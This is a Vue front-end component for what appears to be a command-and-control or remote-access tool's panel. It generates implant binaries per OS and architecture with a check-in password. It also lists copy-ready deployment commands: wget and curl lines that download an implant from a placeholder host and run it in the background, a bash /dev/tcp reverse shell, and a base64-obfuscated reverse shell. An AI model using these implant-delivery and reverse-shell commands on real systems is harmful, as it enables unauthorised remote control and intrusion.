<template>
  <div>
  <el-card class="box-card">
    <div class="form-container">
      <!-- 操作系统选择 -->
      <el-form :model="formData" label-width="120px">

        <el-form-item label="Listener">
          <el-select v-model="formData.listener" placeholder="选择listener" @visible-change="handleDropdown">
            <el-option v-for="item in options" :key="item" :label="item" :value="item" />
          </el-select>
        </el-form-item>

        <el-form-item label="操作系统">
          <el-select v-model="formData.os" placeholder="选择操作系统" @change="handleOSChange">
            <el-option v-for="os in osOptions" :key="os.value" :label="os.label" :value="os.value" />
          </el-select>
        </el-form-item>

        <!-- 架构选择 -->
        <el-form-item label="架构">
          <el-select v-model="formData.arch" placeholder="选择架构" :disabled="archOptions.length === 0">
            <el-option v-for="arch in archOptions" :key="arch" :label="arch" :value="arch" />
          </el-select>
        </el-form-item>
        <el-form-item label="上线密码">
          <el-input v-model="formData.pass" style="width: 220px;"  placeholder="输入上线密码"></el-input>
        </el-form-item>
      </el-form>

      <!-- 生成按钮 -->
      <el-button type="primary" @click="handleGenerate" :disabled="!formData.os || !formData.arch">
        生成
      </el-button>
    </div>
  </el-card>
    <div class="command-prompt">
      <el-card shadow="hover" v-for="(item, index) in commands" :key="index" class="command-item">
        <el-row>
          <el-col :span="4" class="command-name">{{ item.name }}</el-col>
          <el-col :span="20" class="command-code"><code>{{ item.code }}</code></el-col>
        </el-row>
      </el-card>
    </div>
  </div>
</template>

<script setup lang="ts">
import { defineComponent, reactive,ref } from 'vue';
import { ElMessage } from 'element-plus';
import request from '@/utils/request'; // 假设有一个通用的 request 工具
// import {SaveFile} from '../../../wailsjs/go/main/App'
// import {useAxiosConfigStore} from "@/stores/server";
import ClientAPI from "@/api/clients";

const options = ref([]);

const handleDropdown = async()=>{
  const res = await ClientAPI.ShowListener()
  if (res.status ===200){
    if (res.data.status ===200){
      options.value = res.data.data
    }else{
      ElMessage.error(res.data.data)
    }
  }else{
    ElMessage.error("Something wrong")
  }
}

const osOptions = [
  { label: 'windows', value: 'windows' },
  { label: 'linux', value: 'linux' },
  { label: 'darwin', value: 'darwin' }
];

const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64','loong64','mips','mipsle','mips64','mips64le'],
  darwin: ['amd64', 'arm64']
};

// 表单数据
const formData = reactive({
  listener:'',
  os: '',
  arch: '',
  pass:''
});

// 架构选项
const archOptions = reactive<string[]>([]);

// 处理操作系统切换
const handleOSChange = (os: string) => {
  formData.arch = ''; // 清空架构选择
  archOptions.splice(0, archOptions.length, ...(archMapping[os] || []));
};

// 点击生成按钮
const handleGenerate = async () => {
  let res = ''
  try {
    const res = await ClientAPI.GenServer({osType:formData.os,archType:formData.arch,listener:formData.listener,pass:formData.pass})
    if (res.status == 200) {
      ElMessage.success('导出成功')
      const contentDisposition = res.headers['content-disposition'] || ''
      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition)
      let fileName =
          matches && matches.length > 1
              ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
              : 'exported_file'
      let blob = new Blob([res.data], { type: res.headers['content-type'] })
      let downloadElement = document.createElement('a')
      let href = window.URL.createObjectURL(blob) // Create download link
      downloadElement.href = href
      downloadElement.download = fileName // Set the download file name
      document.body.appendChild(downloadElement)
      downloadElement.click() // Trigger download
      document.body.removeChild(downloadElement) // Remove element after download
      window.URL.revokeObjectURL(href) // Release blob object
    } else {
      ElMessage.error('导出失败，请稍后重试')
    }

//     let fileName = "r_"+formData.os+"_"+formData.arch;
//     if(formData.os === "windows"){
//       fileName = fileName + ".exe";
//     }
//
//     // 将响应数据转换为 Blob
//     const blob = new Blob([res.data], { type: res.headers['content-type'] });
//
// // 将 Blob 转换为 ArrayBuffer
//     const arrayBuffer = await blob.arrayBuffer();
//
// // 将 ArrayBuffer 转换为 Uint8Array
//     const uint8Array = new Uint8Array(arrayBuffer);
//
// // 将 Uint8Array 转换为普通的 number[]
//     const numberArray = Array.from(uint8Array);
//
// // 调用后端保存文件
//     try {
//       const filePath = await SaveFile(numberArray, fileName);
//       ElMessage.success(`文件成功保存到 ${filePath}`);
//     } catch (error) {
//       console.error('文件保存失败:', error);
//       ElMessage.error(`下载 ${fileName} 失败`);
//     }


    // res = await GenServer(formData.os,formData.arch,axios.baseURL)
    //
    // ElMessage.success(`命令已成功执行: ${res}`);
  } catch (error) {
    ElMessage.error(`执行命令失败，请检查后端日志 ${res}`);
  }
};
const commands = reactive([
  { name: "上线命令", code: "./r_linux_amd64 [上线密码]" },
  { name: "linux wget上线", code: "wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &" },
  { name: "linux curl上线", code: "curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &" },
  { name: "反弹shell", code: "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1" },
  { name: "反弹shell2", code: "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}" },
]);

const copyToClipboard = (text:string) => {
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success("命令已复制到剪贴板！");
  });
};
</script>

<style scoped>
.box-card {
  max-width: 500px;
  margin: 20px auto;
  padding: 20px;
}

.form-container {
  display: flex;
  flex-direction: column;
  gap: 20px;
}
.command-prompt {
  padding: 20px;
}
.command-item {
  margin-bottom: 10px; /* 减少卡片之间的间距 */
}
.command-name {
  font-weight: bold;
  color: #409EFF;
  margin-bottom: 1px; /* 添加名称和代码之间的间距 */
}
.command-code code {
  background-color: #f5f5f5;
  padding: 10px;
  border-radius: 4px;
  display: block;
  white-space: pre-wrap;
  word-wrap: break-word;
}
</style>
